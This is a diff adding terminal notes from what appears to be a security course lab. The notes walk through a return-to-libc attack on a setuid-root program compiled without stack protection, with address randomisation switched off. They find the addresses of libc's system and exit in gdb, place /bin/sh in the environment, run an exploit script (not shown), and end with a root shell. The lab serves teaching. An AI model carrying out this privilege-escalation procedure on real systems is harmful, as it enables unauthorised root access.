@@ -1,0 +1,47 @@
+
+//Let/bin/sh point to /bin/zsh
+$ sudo ln -sf /bin/zsh /bin/sh
+// After the experiment , do not forget to change it back
+$ sudo ln -sf /bin/dash /bin/sh
+
+gcc -fno-stack-protector -z noexecstack -o stack stack.c
+
+sudo sysctl -w kernel.randomize_va_space=0
+[sudo] password: 
+kernel.randomize_va_space = 0
+
+sudo chown root stack
+sudo chmod 4755 stack
+
+touch badfile
+
+gdb -q stack
+
+(gdb) run
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e379d0 <__GI_exit>
+(gdb) quit
+
+gcc envaddr.c -o env55
+
+export MYSHELL="/bin/sh"
+./env55
+  Value:   /bin/sh
+  Address: bffffe3c
+
+gedit libc_exploit.py
+chmod a+wx libc_exploit.py
+
+
+rm badfile
+
+./libc_exploit.py
+
+./stack
+# 
+# id
+uid=1000(cs4612) gid=1000(cs4612) euid=0(root) groups=1000(cs4612),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
